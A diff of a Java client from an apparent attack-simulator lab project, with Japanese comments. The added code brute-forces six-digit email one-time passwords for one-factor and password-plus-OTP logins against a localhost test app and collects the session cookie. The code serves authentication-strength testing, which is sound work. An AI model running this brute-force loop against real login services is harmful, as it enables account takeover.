@@ -1,156 +1,165 @@
 package com.example.attacksimulator.client;
 
 import java.io.IOException;
-import java.net.CookieManager;
-import java.net.CookiePolicy;
 import java.net.URI;
 import java.net.URLEncoder;
 import java.net.http.HttpClient;
 import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
 import java.nio.charset.StandardCharsets;
+import java.time.Duration;
+import java.util.List;
 
 import org.springframework.stereotype.Component;
 
 @Component
 public class NewAuthLabLoginClient {
 
-	private static final String NEW_AUTH_LAB_URL =
+	// =========================================================
+	// NewAuthLab URL
+	// =========================================================
+
+	private static final String BASE_URL =
 			"http://localhost:8080";
 
-	private final CookieManager cookieManager;
+	// =========================================================
+	// 通常ログイン用
+	// =========================================================
+
+	private static final String ONE_STAGE_LOGIN_URL =
+			BASE_URL + "/login/one-stage";
+
+	private static final String TWO_STAGE_LOGIN_URL =
+			BASE_URL + "/login/two-stage";
+
+	private static final String THREE_STAGE_LOGIN_URL =
+			BASE_URL + "/login/three-stage";
+
+	// =========================================================
+	// One Factor Email OTP
+	// =========================================================
+
+	private static final String SEND_OTP_URL =
+			BASE_URL + "/send-otp";
+
+	private static final String VERIFY_OTP_URL =
+			BASE_URL + "/verify-otp";
+
+	// =========================================================
+	// 二要素認証
+	// AttackSimulator専用エンドポイント
+	// =========================================================
+
+	private static final String TWO_FACTOR_ATTACK_PASSWORD_URL =
+			BASE_URL + "/login/two-factor/attack/password";
+
+	private static final String TWO_FACTOR_ATTACK_VERIFY_OTP_URL =
+			BASE_URL + "/login/two-factor/attack/verify-otp";
+
+	// =========================================================
+	// HTTP Client
+	// =========================================================
+
+	/**
+	 * 通常のHTTP通信
+	 *
+	 * リダイレクトを追従する。
+	 */
 	private final HttpClient httpClient;
+
+	/**
+	 * リダイレクトを追従しないHTTP通信
+	 *
+	 * Locationヘッダーを取得したい場合に使用する。
+	 */
+	private final HttpClient noRedirectHttpClient;
+
+	/**
+	 * Cookie管理
+	 */
+	private final java.net.CookieManager cookieManager;
 
 	public NewAuthLabLoginClient() {
 
-		this.cookieManager =
-				new CookieManager();
+		cookieManager =
+				new java.net.CookieManager(
+						null,
+						java.net.CookiePolicy.ACCEPT_ALL);
 
-		this.cookieManager.setCookiePolicy(
-				CookiePolicy.ACCEPT_ALL);
-
-		this.httpClient =
+		httpClient =
 				HttpClient.newBuilder()
-				.cookieHandler(cookieManager)
+				.connectTimeout(Duration.ofSeconds(10))
 				.followRedirects(
 						HttpClient.Redirect.NORMAL)
+				.cookieHandler(cookieManager)
+				.build();
+
+		noRedirectHttpClient =
+				HttpClient.newBuilder()
+				.connectTimeout(Duration.ofSeconds(10))
+				.followRedirects(
+						HttpClient.Redirect.NEVER)
+				.cookieHandler(cookieManager)
 				.build();
 	}
 
 	// =========================================================
-	// 一段階認証
+	// One Stage Login
 	// =========================================================
 
 	public LoginResult loginOneStage(
 			String username,
 			String password) {
 
-		// 前回のセッションを削除
-		cookieManager.getCookieStore().removeAll();
+		clearCookies();
 
-		System.out.println(
-				"===== loginOneStage 呼び出し =====");
+		String body =
+				"username=" + encode(username)
+				+ "&password=" + encode(password)
+				+ "&fromAttackSimulator=true";
 
-		System.out.println(
-				"username = " + username);
-
-		System.out.println(
-				"password = " + password);
+		HttpRequest request =
+				HttpRequest.newBuilder()
+				.uri(URI.create(ONE_STAGE_LOGIN_URL))
+				.timeout(Duration.ofSeconds(10))
+				.header(
+						"Content-Type",
+						"application/x-www-form-urlencoded")
+				.POST(
+						HttpRequest.BodyPublishers
+						.ofString(body))
+				.build();
 
 		try {
-
-			String requestBody =
-					"username="
-							+ URLEncoder.encode(
-									username,
-									StandardCharsets.UTF_8)
-							+ "&password="
-							+ URLEncoder.encode(
-									password,
-									StandardCharsets.UTF_8);
-
-			HttpRequest request =
-					HttpRequest.newBuilder()
-					.uri(URI.create(
-							NEW_AUTH_LAB_URL
-							+ "/login/one-stage"))
-					.header(
-							"Content-Type",
-							"application/x-www-form-urlencoded")
-					.POST(
-							HttpRequest.BodyPublishers
-							.ofString(
-									requestBody,
-									StandardCharsets.UTF_8))
-					.build();
-
-			System.out.println(
-					"POST /login/one-stage を送信");
 
 			HttpResponse<String> response =
 					httpClient.send(
 							request,
-							HttpResponse.BodyHandlers
-							.ofString(
-									StandardCharsets.UTF_8));
-
-			URI responseUri =
-					response.uri();
-
-			System.out.println(
-					"HTTP Status = "
-							+ response.statusCode());
-
-			System.out.println(
-					"Final URL = "
-							+ responseUri);
-
-			boolean success =
-					"/home".equals(
-							responseUri.getPath());
-
-			System.out.println(
-					"実ログイン成功 = "
-							+ success);
-
-			System.out.println(
-					"================================");
+							HttpResponse.BodyHandlers.ofString());
 
 			return new LoginResult(
-					success,
+					response.statusCode() >= 200
+					&& response.statusCode() < 400,
 					response.statusCode(),
-					responseUri.toString(),
-					response.body());
+					response.uri().toString(),
+					response.body(),
+					getSessionCookie());
 
-		} catch (IOException e) {
-
-			e.printStackTrace();
-
-			return new LoginResult(
-					false,
-					-1,
-					null,
-					"通信エラー: "
-							+ e.getMessage());
-
-		} catch (InterruptedException e) {
+		} catch (IOException | InterruptedException e) {
 
 			Thread.currentThread().interrupt();
 
-			e.printStackTrace();
-
 			return new LoginResult(
 					false,
-					-1,
-					null,
-					"通信が中断されました: "
-							+ e.getMessage());
+					500,
+					ONE_STAGE_LOGIN_URL,
+					e.getMessage(),
+					null);
 		}
 	}
 
 	// =========================================================
-	// 二段階認証
-	// Password → Password2
+	// Two Stage Login
 	// =========================================================
 
 	public LoginResult loginTwoStage(
@@ -158,185 +167,56 @@ public class NewAuthLabLoginClient {
 			String password,
 			String password2) {
 
-		// 二段階認証を開始する前に
-		// 前回のセッションを削除
-		cookieManager.getCookieStore().removeAll();
+		clearCookies();
 
-		System.out.println(
-				"===== loginTwoStage 呼び出し =====");
+		String body =
+				"username=" + encode(username)
+				+ "&password=" + encode(password)
+				+ "&fromAttackSimulator=true"
+				+ "&password2=" + encode(password2);
 
-		System.out.println(
-				"username = " + username);
-
-		System.out.println(
-				"password = " + password);
-
-		System.out.println(
-				"password2 = " + password2);
+		HttpRequest request =
+				HttpRequest.newBuilder()
+				.uri(URI.create(TWO_STAGE_LOGIN_URL))
+				.timeout(Duration.ofSeconds(10))
+				.header(
+						"Content-Type",
+						"application/x-www-form-urlencoded")
+				.POST(
+						HttpRequest.BodyPublishers
+						.ofString(body))
+				.build();
 
 		try {
 
-			// -------------------------------------------------
-			// 1段階目
-			// Password
-			// -------------------------------------------------
-
-			String firstRequestBody =
-					"username="
-							+ URLEncoder.encode(
-									username,
-									StandardCharsets.UTF_8)
-							+ "&password="
-							+ URLEncoder.encode(
-									password,
-									StandardCharsets.UTF_8);
-
-			HttpRequest firstRequest =
-					HttpRequest.newBuilder()
-					.uri(URI.create(
-							NEW_AUTH_LAB_URL
-							+ "/login/two-stage"))
-					.header(
-							"Content-Type",
-							"application/x-www-form-urlencoded")
-					.POST(
-							HttpRequest.BodyPublishers
-							.ofString(
-									firstRequestBody,
-									StandardCharsets.UTF_8))
-					.build();
-
-			System.out.println(
-					"POST /login/two-stage を送信");
-
-			HttpResponse<String> firstResponse =
+			HttpResponse<String> response =
 					httpClient.send(
-							firstRequest,
-							HttpResponse.BodyHandlers
-							.ofString(
-									StandardCharsets.UTF_8));
-
-			System.out.println(
-					"1段階目 HTTP Status = "
-							+ firstResponse.statusCode());
-
-			System.out.println(
-					"1段階目 Final URL = "
-							+ firstResponse.uri());
-
-			// -------------------------------------------------
-			// 1段階目失敗
-			// -------------------------------------------------
-
-			if (!firstResponse.uri()
-					.getPath()
-					.equals(
-							"/login/two-stage/password2")) {
-
-				System.out.println(
-						"1段階目の認証に失敗しました。");
-
-				return new LoginResult(
-						false,
-						firstResponse.statusCode(),
-						firstResponse.uri().toString(),
-						firstResponse.body());
-			}
-
-			// -------------------------------------------------
-			// 2段階目
-			// Password2
-			// -------------------------------------------------
-
-			String secondRequestBody =
-					"password2="
-							+ URLEncoder.encode(
-									password2,
-									StandardCharsets.UTF_8);
-
-			HttpRequest secondRequest =
-					HttpRequest.newBuilder()
-					.uri(URI.create(
-							NEW_AUTH_LAB_URL
-							+ "/login/two-stage/password2"))
-					.header(
-							"Content-Type",
-							"application/x-www-form-urlencoded")
-					.POST(
-							HttpRequest.BodyPublishers
-							.ofString(
-									secondRequestBody,
-									StandardCharsets.UTF_8))
-					.build();
-
-			System.out.println(
-					"POST /login/two-stage/password2 を送信");
-
-			HttpResponse<String> secondResponse =
-					httpClient.send(
-							secondRequest,
-							HttpResponse.BodyHandlers
-							.ofString(
-									StandardCharsets.UTF_8));
-
-			System.out.println(
-					"2段階目 HTTP Status = "
-							+ secondResponse.statusCode());
-
-			System.out.println(
-					"2段階目 Final URL = "
-							+ secondResponse.uri());
-
-			// -------------------------------------------------
-			// 最終的に /home なら成功
-			// -------------------------------------------------
-
-			boolean success =
-					"/home".equals(
-							secondResponse.uri().getPath());
-
-			System.out.println(
-					"実ログイン成功 = "
-							+ success);
-
-			System.out.println(
-					"================================");
+							request,
+							HttpResponse.BodyHandlers.ofString());
 
 			return new LoginResult(
-					success,
-					secondResponse.statusCode(),
-					secondResponse.uri().toString(),
-					secondResponse.body());
+					response.statusCode() >= 200
+					&& response.statusCode() < 400,
+					response.statusCode(),
+					response.uri().toString(),
+					response.body(),
+					getSessionCookie());
 
-		} catch (IOException e) {
-
-			e.printStackTrace();
-
-			return new LoginResult(
-					false,
-					-1,
-					null,
-					"通信エラー: "
-							+ e.getMessage());
-
-		} catch (InterruptedException e) {
+		} catch (IOException | InterruptedException e) {
 
 			Thread.currentThread().interrupt();
 
-			e.printStackTrace();
-
 			return new LoginResult(
 					false,
-					-1,
-					null,
-					"通信が中断されました: "
-							+ e.getMessage());
+					500,
+					TWO_STAGE_LOGIN_URL,
+					e.getMessage(),
+					null);
 		}
 	}
 
 	// =========================================================
-	// 三段階認証
-	// Password → Password2 → Password3
+	// Three Stage Login
 	// =========================================================
 
 	public LoginResult loginThreeStage(
@@ -345,397 +225,537 @@ public class NewAuthLabLoginClient {
 			String password2,
 			String password3) {
 
-		// 前回のセッションを削除
-		cookieManager.getCookieStore().removeAll();
+		clearCookies();
 
-		System.out.println(
-				"===== loginThreeStage 呼び出し =====");
+		String body =
+				"username=" + encode(username)
+				+ "&password=" + encode(password)
+				+ "&password2=" + encode(password2)
+				+ "&password3=" + encode(password3)
+				+ "&fromAttackSimulator=true";
 
-		System.out.println(
-				"username = " + username);
-
-		System.out.println(
-				"password = " + password);
-
-		System.out.println(
-				"password2 = " + password2);
-
-		System.out.println(
-				"password3 = " + password3);
+		HttpRequest request =
+				HttpRequest.newBuilder()
+				.uri(URI.create(THREE_STAGE_LOGIN_URL))
+				.timeout(Duration.ofSeconds(10))
+				.header(
+						"Content-Type",
+						"application/x-www-form-urlencoded")
+				.POST(
+						HttpRequest.BodyPublishers
+						.ofString(body))
+				.build();
 
 		try {
 
-			// =================================================
-			// 1段階目
-			// Password
-			// =================================================
-
-			String firstRequestBody =
-					"username="
-							+ URLEncoder.encode(
-									username,
-									StandardCharsets.UTF_8)
-							+ "&password="
-							+ URLEncoder.encode(
-									password,
-									StandardCharsets.UTF_8);
-
-			HttpRequest firstRequest =
-					HttpRequest.newBuilder()
-					.uri(URI.create(
-							NEW_AUTH_LAB_URL
-							+ "/login/three-stage"))
-					.header(
-							"Content-Type",
-							"application/x-www-form-urlencoded")
-					.POST(
-							HttpRequest.BodyPublishers
-							.ofString(
-									firstRequestBody,
-									StandardCharsets.UTF_8))
-					.build();
-
-			System.out.println(
-					"POST /login/three-stage を送信");
-
-			HttpResponse<String> firstResponse =
+			HttpResponse<String> response =
 					httpClient.send(
-							firstRequest,
-							HttpResponse.BodyHandlers
-							.ofString(
-									StandardCharsets.UTF_8));
-
-			System.out.println(
-					"1段階目 HTTP Status = "
-							+ firstResponse.statusCode());
-
-			System.out.println(
-					"1段階目 Final URL = "
-							+ firstResponse.uri());
-
-			// 1段階目失敗
-			if (!firstResponse.uri()
-					.getPath()
-					.equals(
-							"/login/three-stage/password2")) {
-
-				System.out.println(
-						"1段階目の認証に失敗しました。");
-
-				return new LoginResult(
-						false,
-						firstResponse.statusCode(),
-						firstResponse.uri().toString(),
-						firstResponse.body());
-			}
-
-			// =================================================
-			// 2段階目
-			// Password2
-			// =================================================
-
-			String secondRequestBody =
-					"password2="
-							+ URLEncoder.encode(
-									password2,
-									StandardCharsets.UTF_8);
-
-			HttpRequest secondRequest =
-					HttpRequest.newBuilder()
-					.uri(URI.create(
-							NEW_AUTH_LAB_URL
-							+ "/login/three-stage/password2"))
-					.header(
-							"Content-Type",
-							"application/x-www-form-urlencoded")
-					.POST(
-							HttpRequest.BodyPublishers
-							.ofString(
-									secondRequestBody,
-									StandardCharsets.UTF_8))
-					.build();
-
-			System.out.println(
-					"POST /login/three-stage/password2 を送信");
-
-			HttpResponse<String> secondResponse =
-					httpClient.send(
-							secondRequest,
-							HttpResponse.BodyHandlers
-							.ofString(
-									StandardCharsets.UTF_8));
-
-			System.out.println(
-					"2段階目 HTTP Status = "
-							+ secondResponse.statusCode());
-
-			System.out.println(
-					"2段階目 Final URL = "
-							+ secondResponse.uri());
-
-			// 2段階目失敗
-			if (!secondResponse.uri()
-					.getPath()
-					.equals(
-							"/login/three-stage/password3")) {
-
-				System.out.println(
-						"2段階目の認証に失敗しました。");
-
-				return new LoginResult(
-						false,
-						secondResponse.statusCode(),
-						secondResponse.uri().toString(),
-						secondResponse.body());
-			}
-
-			// =================================================
-			// 3段階目
-			// Password3
-			// =================================================
-
-			String thirdRequestBody =
-					"password3="
-							+ URLEncoder.encode(
-									password3,
-									StandardCharsets.UTF_8);
-
-			HttpRequest thirdRequest =
-					HttpRequest.newBuilder()
-					.uri(URI.create(
-							NEW_AUTH_LAB_URL
-							+ "/login/three-stage/password3"))
-					.header(
-							"Content-Type",
-							"application/x-www-form-urlencoded")
-					.POST(
-							HttpRequest.BodyPublishers
-							.ofString(
-									thirdRequestBody,
-									StandardCharsets.UTF_8))
-					.build();
-
-			System.out.println(
-					"POST /login/three-stage/password3 を送信");
-
-			HttpResponse<String> thirdResponse =
-					httpClient.send(
-							thirdRequest,
-							HttpResponse.BodyHandlers
-							.ofString(
-									StandardCharsets.UTF_8));
-
-			System.out.println(
-					"3段階目 HTTP Status = "
-							+ thirdResponse.statusCode());
-
-			System.out.println(
-					"3段階目 Final URL = "
-							+ thirdResponse.uri());
-
-			// =================================================
-			// 最終的に /home なら成功
-			// =================================================
-
-			boolean success =
-					"/home".equals(
-							thirdResponse.uri()
-							.getPath());
-
-			System.out.println(
-					"実ログイン成功 = "
-							+ success);
-
-			System.out.println(
-					"================================");
+							request,
+							HttpResponse.BodyHandlers.ofString());
 
 			return new LoginResult(
-					success,
-					thirdResponse.statusCode(),
-					thirdResponse.uri().toString(),
-					thirdResponse.body());
+					response.statusCode() >= 200
+					&& response.statusCode() < 400,
+					response.statusCode(),
+					response.uri().toString(),
+					response.body(),
+					getSessionCookie());
 
-		} catch (IOException e) {
-
-			e.printStackTrace();
-
-			return new LoginResult(
-					false,
-					-1,
-					null,
-					"通信エラー: "
-							+ e.getMessage());
-
-		} catch (InterruptedException e) {
+		} catch (IOException | InterruptedException e) {
 
 			Thread.currentThread().interrupt();
 
-			e.printStackTrace();
-
 			return new LoginResult(
 					false,
-					-1,
-					null,
-					"通信が中断されました: "
-							+ e.getMessage());
+					500,
+					THREE_STAGE_LOGIN_URL,
+					e.getMessage(),
+					null);
 		}
 	}
 
 	// =========================================================
-	// 一要素認証
-	// Email OTP
+	// Email OTP送信
+	// One Factor Email OTP用
+	// =========================================================
+
+	public LoginResult sendEmailOtp(
+			String email) {
+
+		clearCookies();
+
+		String body =
+				"email=" + encode(email)
+				+ "&fromAttackSimulator=true";
+
+		HttpRequest request =
+				HttpRequest.newBuilder()
+				.uri(URI.create(SEND_OTP_URL))
+				.timeout(Duration.ofSeconds(10))
+				.header(
+						"Content-Type",
+						"application/x-www-form-urlencoded")
+				.POST(
+						HttpRequest.BodyPublishers
+						.ofString(body))
+				.build();
+
+		try {
+
+			HttpResponse<String> response =
+					noRedirectHttpClient.send(
+							request,
+							HttpResponse.BodyHandlers.ofString());
+
+			return new LoginResult(
+					response.statusCode() >= 200
+					&& response.statusCode() < 400,
+					response.statusCode(),
+					response.headers()
+					.firstValue("Location")
+					.orElse(response.uri().toString()),
+					response.body(),
+					getSessionCookie());
+
+		} catch (IOException | InterruptedException e) {
+
+			Thread.currentThread().interrupt();
+
+			return new LoginResult(
+					false,
+					500,
+					SEND_OTP_URL,
+					e.getMessage(),
+					null);
+		}
+	}
+
+	// =========================================================
+	// Email OTP確認
+	// One Factor Email OTP用
+	// =========================================================
+
+	public LoginResult verifyEmailOtp(
+			String otp) {
+
+		String body =
+				"code=" + encode(otp);
+
+		HttpRequest request =
+				HttpRequest.newBuilder()
+				.uri(URI.create(VERIFY_OTP_URL))
+				.timeout(Duration.ofSeconds(10))
+				.header(
+						"Content-Type",
+						"application/x-www-form-urlencoded")
+				.POST(
+						HttpRequest.BodyPublishers
+						.ofString(body))
+				.build();
+
+		try {
+
+			HttpResponse<String> response =
+					noRedirectHttpClient.send(
+							request,
+							HttpResponse.BodyHandlers.ofString());
+
+			String location =
+					response.headers()
+					.firstValue("Location")
+					.orElse(
+							response.uri()
+							.toString());
+
+			boolean success =
+					location.startsWith(
+							BASE_URL + "/attack-login?ticket=");
+
+			return new LoginResult(
+					success,
+					response.statusCode(),
+					location,
+					response.body(),
+					getSessionCookie());
+
+		} catch (IOException | InterruptedException e) {
+
+			Thread.currentThread().interrupt();
+
+			return new LoginResult(
+					false,
+					500,
+					VERIFY_OTP_URL,
+					e.getMessage(),
+					null);
+		}
+	}
+
+	// =========================================================
+	// One Factor Email OTP
 	// =========================================================
 
 	public LoginResult loginOneFactorEmailOtp(
 			String email,
-			String otp) {
+			int maxOtpAttempts) {
 
-		// 前回のセッションを削除
-		cookieManager.getCookieStore().removeAll();
+		clearCookies();
 
-		System.out.println(
-				"===== loginOneFactorEmailOtp 呼び出し =====");
+		LoginResult sendResult =
+				sendEmailOtp(email);
 
-		System.out.println(
-				"email = " + email);
+		if (!sendResult.isRequestSuccess()) {
+			return sendResult;
+		}
 
-		System.out.println(
-				"otp = " + otp);
+		int actualMaxAttempts =
+				Math.max(
+						1,
+						Math.min(
+								maxOtpAttempts,
+								1_000_000));
+
+		int attemptCount = 0;
+
+		for (int i = 0;
+				i < 1_000_000;
+				i++) {
+
+			if (attemptCount >= actualMaxAttempts) {
+				break;
+			}
+
+			String candidate =
+					String.format(
+							"%06d",
+							i);
+
+			attemptCount++;
+
+			LoginResult verifyResult =
+					verifyEmailOtp(candidate);
+
+			if (verifyResult.isSuccess()) {
+
+				return new LoginResult(
+						true,
+						verifyResult.getStatusCode(),
+						verifyResult.getFinalUrl(),
+						verifyResult.getResponseBody(),
+						candidate,
+						attemptCount,
+						getSessionCookie());
+			}
+		}
+
+		return new LoginResult(
+				false,
+				200,
+				VERIFY_OTP_URL,
+				"Email OTP総当たりに失敗しました",
+				null,
+				attemptCount,
+				getSessionCookie());
+	}
+
+	// =========================================================
+	// 二要素認証
+	// Password → Email OTP
+	// AttackSimulator専用
+	// =========================================================
+
+	public LoginResult loginTwoFactorPasswordEmailOtp(
+			String username,
+			String password,
+			int maxOtpAttempts) {
+
+		clearCookies();
+
+		System.out.println("========================================");
+		System.out.println("二要素認証開始");
+		System.out.println("username = " + username);
+		System.out.println("OTP最大試行回数 = " + maxOtpAttempts);
+		System.out.println("========================================");
+
+		// -----------------------------------------------------
+		// Password認証
+		// -----------------------------------------------------
+
+		String passwordBody =
+				"username=" + encode(username)
+				+ "&password=" + encode(password);
+
+		HttpRequest passwordRequest =
+				HttpRequest.newBuilder()
+				.uri(
+						URI.create(
+								TWO_FACTOR_ATTACK_PASSWORD_URL))
+				.timeout(Duration.ofSeconds(10))
+				.header(
+						"Content-Type",
+						"application/x-www-form-urlencoded")
+				.POST(
+						HttpRequest.BodyPublishers
+						.ofString(passwordBody))
+				.build();
 
 		try {
 
-			// =================================================
-			// 1. OTP送信
-			// =================================================
-
-			String sendOtpBody =
-					"email="
-							+ URLEncoder.encode(
-									email,
-									StandardCharsets.UTF_8);
-
-			HttpRequest sendOtpRequest =
-					HttpRequest.newBuilder()
-					.uri(URI.create(
-							NEW_AUTH_LAB_URL
-							+ "/send-otp"))
-					.header(
-							"Content-Type",
-							"application/x-www-form-urlencoded")
-					.POST(
-							HttpRequest.BodyPublishers
-							.ofString(
-									sendOtpBody,
-									StandardCharsets.UTF_8))
-					.build();
+			HttpResponse<String> passwordResponse =
+					noRedirectHttpClient.send(
+							passwordRequest,
+							HttpResponse.BodyHandlers.ofString());
 
 			System.out.println(
-					"POST /send-otp を送信");
-
-			HttpResponse<String> sendOtpResponse =
-					httpClient.send(
-							sendOtpRequest,
-							HttpResponse.BodyHandlers
-							.ofString(
-									StandardCharsets.UTF_8));
-
+					"二要素Passwordレスポンス");
 			System.out.println(
-					"OTP送信 HTTP Status = "
-							+ sendOtpResponse.statusCode());
-
-			// =================================================
-			// 2. OTP確認
-			// =================================================
-
-			String verifyOtpBody =
-					"otp="
-							+ URLEncoder.encode(
-									otp,
-									StandardCharsets.UTF_8);
-
-			HttpRequest verifyOtpRequest =
-					HttpRequest.newBuilder()
-					.uri(URI.create(
-							NEW_AUTH_LAB_URL
-							+ "/verify-otp"))
-					.header(
-							"Content-Type",
-							"application/x-www-form-urlencoded")
-					.POST(
-							HttpRequest.BodyPublishers
-							.ofString(
-									verifyOtpBody,
-									StandardCharsets.UTF_8))
-					.build();
-
+					"HTTP Status = "
+							+ passwordResponse.statusCode());
 			System.out.println(
-					"POST /verify-otp を送信");
+					"Body = "
+							+ passwordResponse.body());
 
-			HttpResponse<String> verifyOtpResponse =
-					httpClient.send(
-							verifyOtpRequest,
-							HttpResponse.BodyHandlers
-							.ofString(
-									StandardCharsets.UTF_8));
+			// -------------------------------------------------
+			// Password認証失敗
+			// -------------------------------------------------
 
-			System.out.println(
-					"OTP確認 HTTP Status = "
-							+ verifyOtpResponse.statusCode());
+			if (passwordResponse.statusCode() < 200
+					|| passwordResponse.statusCode() >= 300) {
 
-			System.out.println(
-					"OTP確認後 URL = "
-							+ verifyOtpResponse.uri());
+				return new LoginResult(
+						false,
+						passwordResponse.statusCode(),
+						passwordResponse.uri().toString(),
+						passwordResponse.body(),
+						null,
+						0,
+						getSessionCookie());
+			}
 
-			// =================================================
-			// 現在のEmailControllerでは
-			// 成功時も redirect ではなく "index" を返す
-			// =================================================
+			if (!"OTP_SENT".equals(
+					passwordResponse.body().trim())) {
 
-			boolean success =
-					verifyOtpResponse.body()
-					.contains("ログイン成功");
+				return new LoginResult(
+						false,
+						passwordResponse.statusCode(),
+						passwordResponse.uri().toString(),
+						passwordResponse.body(),
+						null,
+						0,
+						getSessionCookie());
+			}
 
-			System.out.println(
-					"Email OTP実ログイン成功 = "
-							+ success);
+			// -------------------------------------------------
+			// OTP総当たり
+			// -------------------------------------------------
 
-			System.out.println(
-					"========================================");
+			int actualMaxAttempts =
+					Math.max(
+							1,
+							Math.min(
+									maxOtpAttempts,
+									1_000_000));
 
-			return new LoginResult(
-					success,
-					verifyOtpResponse.statusCode(),
-					verifyOtpResponse.uri().toString(),
-					verifyOtpResponse.body());
+			int otpAttemptCount = 0;
 
-		} catch (IOException e) {
+			for (int i = 0;
+					i < 1_000_000;
+					i++) {
 
-			e.printStackTrace();
+				if (otpAttemptCount
+						>= actualMaxAttempts) {
+
+					break;
+				}
+
+				String candidate =
+						String.format(
+								"%06d",
+								i);
+
+				otpAttemptCount++;
+
+				LoginResult verifyResult =
+						verifyTwoFactorOtp(candidate);
+
+				if (verifyResult.isSuccess()) {
+
+					System.out.println(
+							"二要素OTP突破成功");
+					System.out.println(
+							"OTP = " + candidate);
+					System.out.println(
+							"OTP試行回数 = "
+									+ otpAttemptCount);
+					System.out.println(
+							"========================================");
+
+					return new LoginResult(
+							true,
+							verifyResult.getStatusCode(),
+							verifyResult.getFinalUrl(),
+							verifyResult.getResponseBody(),
+							candidate,
+							otpAttemptCount,
+							getSessionCookie());
+				}
+			}
+
+			// -------------------------------------------------
+			// OTP最大試行回数到達
+			// -------------------------------------------------
 
 			return new LoginResult(
 					false,
-					-1,
+					200,
+					TWO_FACTOR_ATTACK_VERIFY_OTP_URL,
+					"Email OTP総当たりに失敗しました",
 					null,
-					"通信エラー: "
-							+ e.getMessage());
+					otpAttemptCount,
+					getSessionCookie());
 
-		} catch (InterruptedException e) {
+		} catch (IOException | InterruptedException e) {
 
 			Thread.currentThread().interrupt();
 
-			e.printStackTrace();
-
 			return new LoginResult(
 					false,
-					-1,
+					500,
+					TWO_FACTOR_ATTACK_PASSWORD_URL,
+					e.getMessage(),
 					null,
-					"通信が中断されました: "
-							+ e.getMessage());
+					0,
+					getSessionCookie());
 		}
 	}
 
 	// =========================================================
-	// ログイン結果
+	// 二要素認証 OTP確認
+	// =========================================================
+
+	private LoginResult verifyTwoFactorOtp(
+			String otp) {
+
+		String body =
+				"otp=" + encode(otp);
+
+		HttpRequest request =
+				HttpRequest.newBuilder()
+				.uri(
+						URI.create(
+								TWO_FACTOR_ATTACK_VERIFY_OTP_URL))
+				.timeout(Duration.ofSeconds(10))
+				.header(
+						"Content-Type",
+						"application/x-www-form-urlencoded")
+				.POST(
+						HttpRequest.BodyPublishers
+						.ofString(body))
+				.build();
+
+		try {
+
+			HttpResponse<String> response =
+					noRedirectHttpClient.send(
+							request,
+							HttpResponse.BodyHandlers.ofString());
+
+			String location =
+					response.headers()
+					.firstValue("Location")
+					.orElse(
+							response.uri()
+							.toString());
+
+			boolean success =
+					response.statusCode() >= 300
+					&& response.statusCode() < 400
+					&& (
+							location.startsWith(
+									BASE_URL
+									+ "/attack-login?ticket=")
+							||
+							location.startsWith(
+									"/attack-login?ticket=")
+							);
+
+					return new LoginResult(
+							success,
+							response.statusCode(),
+							location,
+							response.body(),
+							getSessionCookie());
+
+		} catch (IOException | InterruptedException e) {
+
+			Thread.currentThread().interrupt();
+
+			return new LoginResult(
+					false,
+					500,
+					TWO_FACTOR_ATTACK_VERIFY_OTP_URL,
+					e.getMessage(),
+					null);
+		}
+	}
+
+	// =========================================================
+	// Cookie取得
+	// =========================================================
+
+	public String getSessionCookie() {
+
+		try {
+
+			List<java.net.HttpCookie> cookies =
+					cookieManager.getCookieStore()
+					.getCookies();
+
+			for (java.net.HttpCookie cookie : cookies) {
+
+				if ("JSESSIONID".equals(
+						cookie.getName())) {
+
+					return cookie.getName()
+							+ "="
+							+ cookie.getValue();
+				}
+			}
+
+		} catch (Exception ignored) {
+		}
+
+		return null;
+	}
+
+	// =========================================================
+	// Cookie削除
+	// =========================================================
+
+	public void clearCookies() {
+
+		cookieManager.getCookieStore()
+		.removeAll();
+	}
+
+	// =========================================================
+	// URLエンコード
+	// =========================================================
+
+	private String encode(
+			String value) {
+
+		if (value == null) {
+			return "";
+		}
+
+		return URLEncoder.encode(
+				value,
+				StandardCharsets.UTF_8);
+	}
+
+	// =========================================================
+	// LoginResult
 	// =========================================================
 
 	public static class LoginResult {
@@ -745,20 +765,78 @@ public class NewAuthLabLoginClient {
 		private final String finalUrl;
 		private final String responseBody;
 
+		private final String otp;
+		private final int attemptCount;
+
+		private final String sessionCookie;
+
+		// -----------------------------------------------------
+		// 通常ログイン用
+		// -----------------------------------------------------
+
 		public LoginResult(
 				boolean success,
 				int statusCode,
 				String finalUrl,
-				String responseBody) {
+				String responseBody,
+				String sessionCookie) {
 
-			this.success = success;
-			this.statusCode = statusCode;
-			this.finalUrl = finalUrl;
-			this.responseBody = responseBody;
+			this(
+					success,
+					statusCode,
+					finalUrl,
+					responseBody,
+					null,
+					0,
+					sessionCookie);
 		}
+
+		// -----------------------------------------------------
+		// OTP / 試行回数付き
+		// -----------------------------------------------------
+
+		public LoginResult(
+				boolean success,
+				int statusCode,
+				String finalUrl,
+				String responseBody,
+				String otp,
+				int attemptCount,
+				String sessionCookie) {
+
+			this.success =
+					success;
+
+			this.statusCode =
+					statusCode;
+
+			this.finalUrl =
+					finalUrl;
+
+			this.responseBody =
+					responseBody;
+
+			this.otp =
+					otp;
+
+			this.attemptCount =
+					attemptCount;
+
+			this.sessionCookie =
+					sessionCookie;
+		}
+
+		// -----------------------------------------------------
+		// Getter
+		// -----------------------------------------------------
 
 		public boolean isSuccess() {
 			return success;
+		}
+
+		public boolean isRequestSuccess() {
+			return statusCode >= 200
+					&& statusCode < 400;
 		}
 
 		public int getStatusCode() {
@@ -771,6 +849,18 @@ public class NewAuthLabLoginClient {
 
 		public String getResponseBody() {
 			return responseBody;
+		}
+
+		public String getOtp() {
+			return otp;
+		}
+
+		public int getAttemptCount() {
+			return attemptCount;
+		}
+
+		public String getSessionCookie() {
+			return sessionCookie;
 		}
 	}
 }
